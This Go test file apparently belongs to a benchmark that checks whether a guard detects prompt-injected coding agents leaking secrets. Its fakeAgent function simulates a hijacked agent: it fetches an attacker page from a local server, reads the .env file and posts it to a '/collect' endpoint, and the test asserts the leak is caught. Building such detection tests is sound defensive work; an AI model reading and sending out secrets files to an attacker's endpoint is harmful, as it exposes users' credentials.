package main

import (
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/durgavarapraveen/provguard/bench"
)

// TestMain lets the test binary act as a fake, fully hijacked agent when
// PG_FAKE_AGENT is set. liveOnce runs it as if it were `claude -p PROMPT`.
func TestMain(m *testing.M) {
	if os.Getenv("PG_FAKE_AGENT") == "1" {
		fakeAgent()
		os.Exit(0)
	}
	os.Exit(m.Run())
}

var urlInPrompt = regexp.MustCompile(`http://127\.0\.0\.1:\d+`)

// fakeAgent: reads the attacker page, then does what a hijacked agent does:
// posts .env to the attacker. It also checks it got an isolated provguard home.
func fakeAgent() {
	prompt := ""
	for i, a := range os.Args {
		if a == "-p" && i+1 < len(os.Args) {
			prompt = os.Args[i+1]
		}
	}
	base := urlInPrompt.FindString(prompt)
	if base == "" || !strings.Contains(os.Getenv("PROVGUARD_HOME"), "pgbench-home-") {
		os.Exit(3)
	}
	resp, err := http.Get(base + "/page")
	if err != nil {
		os.Exit(4)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	env, err := os.ReadFile(".env")
	if err != nil {
		os.Exit(5)
	}
	r, err := http.Post(base+"/collect", "text/plain", strings.NewReader(string(env)))
	if err == nil {
		r.Body.Close()
	}
}

func TestLiveHarnessWithFakeAgent(t *testing.T) {
	cases, err := bench.Load()
	if err != nil {
		t.Fatal(err)
	}
	var c bench.Case
	for _, x := range cases {
		if x.ID == "01" {
			c = x
		}
	}
	exe, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	t.Setenv("PG_FAKE_AGENT", "1")
	r := liveOnce(exe, "fake", c, "audit", 1)
	if r.Error != "" {
		t.Fatalf("harness error: %s", r.Error)
	}
	if !r.Leaked || r.Requests != 1 {
		t.Fatalf("fake agent leak not detected: %+v", r)
	}
}
